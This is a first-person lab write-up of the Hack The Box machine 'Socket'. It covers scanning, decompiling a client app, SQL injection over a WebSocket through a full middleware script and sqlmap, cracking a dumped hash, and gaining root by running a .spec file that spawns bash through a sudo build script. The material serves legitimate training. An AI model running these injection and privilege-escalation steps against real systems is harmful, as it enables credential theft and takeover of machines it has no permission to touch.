  ![image](https://user-images.githubusercontent.com/87700008/228204118-767d13c9-a55e-4531-8f1b-330d9d209a2b.png)
  
https://app.hackthebox.com/machines/Socket

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration :

I began my enumeration by using the rustscan tool, which revealed that there were three open ports on the target machine:

    sudo rustscan -a 10.10.11.206 -- -sC -sV -vv -oN socket_nmap
    
![image](https://user-images.githubusercontent.com/87700008/228204930-97866a5d-513b-44a8-9703-ee494880671e.png)

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://qreader.htb/
5789/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 27 Mar 2023 17:16:46 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 27 Mar 2023 17:16:47 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
|   Help, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 27 Mar 2023 17:17:03 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5789-TCP:V=7.91%I=7%D=3/27%Time=6421CF7A%P=x86_64-unknown-linux-gnu
SF:%r(GenericLines,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Mon,

SF:\x2027\x20Mar\x202023\x2017:16:46\x20GMT\r\nServer:\x20Python/3\.10\x20
SF:websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/plai
SF:n\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20WebSocket
SF:\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x20reque
SF:st\.\n")%r(GetRequest,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x
SF:20Mon,\x2027\x20Mar\x202023\x2017:16:46\x20GMT\r\nServer:\x20Python/3\.
SF:10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20tex
SF:t/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20Web
SF:Socket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x2
SF:0request\.\n")%r(HTTPOptions,F4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Date:\x20Mon,\x2027\x20Mar\x202023\x2017:16:47\x20GMT\r\nServer:\x20Pyt
SF:hon/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:
SF:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a
SF:\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20
SF:HTTP\x20request\.\n")%r(RTSPRequest,F4,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nDate:\x20Mon,\x2027\x20Mar\x202023\x2017:16:47\x20GMT\r\nServer:
SF:\x20Python/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nConten
SF:t-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20op
SF:en\x20a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20va
SF:lid\x20HTTP\x20request\.\n")%r(Help,F4,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nDate:\x20Mon,\x2027\x20Mar\x202023\x2017:17:03\x20GMT\r\nServer:
SF:\x20Python/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nConten
SF:t-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20op
SF:en\x20a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20va
SF:lid\x20HTTP\x20request\.\n")%r(SSLSessionReq,F4,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nDate:\x20Mon,\x2027\x20Mar\x202023\x2017:17:03\x20GMT\r
SF:\nServer:\x20Python/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\
SF:r\nContent-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x2
SF:0to\x20open\x20a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x
SF:20a\x20valid\x20HTTP\x20request\.\n");
Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I noticed that port 80 was hosting a website with the domain "http://qreader.htb/". To access this site, I added the domain to my /etc/hosts file.

Upon visiting the site, I discovered that it was accepting QR codes as input and displaying the embedded text from the code.

![image](https://user-images.githubusercontent.com/87700008/229103303-772de251-d144-473b-b6bc-57aac382dba7.png)

I searched for any subdirectories and found that there were three open directories:

![image](https://user-images.githubusercontent.com/87700008/229103939-cb6cb1dc-4514-4ed6-9b8e-aa0e7075cadb.png)

However, there was nothing particularly noteworthy in these directories.

During my port scan, I noticed that port 5789 had an open WebSocket. To enumerate this WebSocket, I downloaded a script from GitHub called [STEWS](https://github.com/PalindromeLabs/STEWS).

    python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
    
![image](https://user-images.githubusercontent.com/87700008/229136259-3425ae45-de4b-4e02-bb33-35fa50066725.png)

After running the script, I discovered a vulnerable directory at ws://qreader.htb:5789, but it did not provide much useful information.

On the website, there was an option to download an app for Windows and Linux. I downloaded the Windows executable from the site.

![image](https://user-images.githubusercontent.com/87700008/229138351-ebfe702d-2b82-4002-a7fa-9ab283497acd.png)

After downloading the binary, I decompiled it using [pycdc](https://github.com/zrax/pycdc/) and found the following code:

```
import cv2
import sys
import qrcode
import tempfile
import random
import os
from PyQt5.QtWidgets import *
from PyQt5 import uic, QtGui
import asyncio
import websockets
import json
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
icon_path = './icon.png'

def setup_env():
    global tmp_file_name
    pass
# WARNING: Decompyle incomplete


class MyGUI(QMainWindow):
    
    ...
    
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

    
    def update(self):
        response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            msg = '[INFO] ' + data['message']
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

    __classcell__ = None


async def ws_connect(url, msg):
    pass
# WARNING: Decompyle incomplete


def main():
    (status, e) = setup_env()
    if not status:
        print('[-] Problem occured while setting up the env!')
    app = QApplication([])
    window = MyGUI()
    app.exec_()

if __name__ == '__main__':
    main()
    return None
```

While decompiling the downloaded Windows executable, I discovered a socket domain, ws.qreader.htb, which I added to my hosts file for later use.

However, I hit a roadblock and was unable to make any progress. After some research, I check the Hack The Box forum for this machine and learned that there was an SQL injection vulnerability in the code:

```
def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)
```
After analyzing the decompiled code, I discovered an SQL injection vulnerability in the /version parameter. Using hints from [Rayhan’s middleware to map everything using SQLmap](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html), I made some necessary changes to the script until I received a response.

![image](https://user-images.githubusercontent.com/87700008/229338436-80aacd23-e06a-4f94-837e-b7c3852c8c0c.png)

Using this script, I was able to gain further access to the machine :

```
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://ws.qreader.htb:5789/version"  #changed the paramter here as per our target.

def send_ws(payload):
    ws = create_connection(ws_server)
    # If the server returns a response on connect, use below line   
    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
    
    # For our case, format the payload in JSON
    message = unquote(payload).replace('\'','\\\"') # replacing " with ' to avoid breaking JSON structure
    data = '{"version":"%s"}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
                
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```

In one terminal, I ran Rayhan's script:

```
python3 sqli.py
```

In another terminal, I launched SqlMap using the vulnerable /version parameter and the -u option:

```
sqlmap -u "http://localhost:8081/version?version=0.0.2" --level=5 --risk=3 --batch --dbs --dump
```
![image](https://user-images.githubusercontent.com/87700008/229338657-bc22c512-006a-4dab-9b8e-58c1c1c31e33.png)

After only a minute, SqlMap dumped the password hash and other information :

![image](https://user-images.githubusercontent.com/87700008/229338788-17cf2f0e-7bea-4f37-a1e3-0a80a16c561d.png)

I quickly cracked the hash using John The Ripper:

![image](https://user-images.githubusercontent.com/87700008/229338894-47f0396c-dbe1-4fb7-86f2-6641c52ce540.png)

Using the cracked credentials, I tried to log in, but the username "admin" did not work.

However, SqlMap had revealed another user, "Thomas Keller," in its results. I guessed that his username might be in the format "first letter of the first name + last name," which is common in corporate environments.

Using the username "tkeller" along with the cracked password, I was able to log in and obtain the user flag from Thomas's home directory.

![image](https://user-images.githubusercontent.com/87700008/229339142-662aad1c-9079-4205-b249-796569c6bb0d.png)

I used the username "tkeller" along with the cracked credentials & this time it worked.
I got the user flag in Thomas home directory. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/229339231-89911dc1-6997-4d88-8f4e-987b163bbe59.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Priv Esc :

To obtain the root flag, I started by checking the sudo permissions (sudo -l) and discovered that, as Thomas, I can run the 'build-installer.sh' script with sudo access:

![image](https://user-images.githubusercontent.com/87700008/229339306-42baff1c-ca56-4c4d-9ddd-044160b4ed81.png)

I checked the script and found this code:

```
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

This part of the code provides hints that we can run a .spec file and become root, as seen here:

```
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
```

![image](https://user-images.githubusercontent.com/87700008/229340486-12852eb7-a112-400b-bdef-2beff2ba1740.png)


I created a file in the root directory with the following command:

```
echo 'import os;os.system("/bin/bash")' > /tmp/shell.spec #as per the code we can run .spec file from the /tmp directory
```

Then I executed the file with the following commands, which gave me root:

```
sudo /usr/local/sbin/build-installer.sh build /tmp/shell.spec
```

![image](https://user-images.githubusercontent.com/87700008/229340675-58224dc5-8e9f-4f61-bc72-1f22a3b672c8.png)

I got the root shell & fetched the root flag. (pwn3d!🙂)


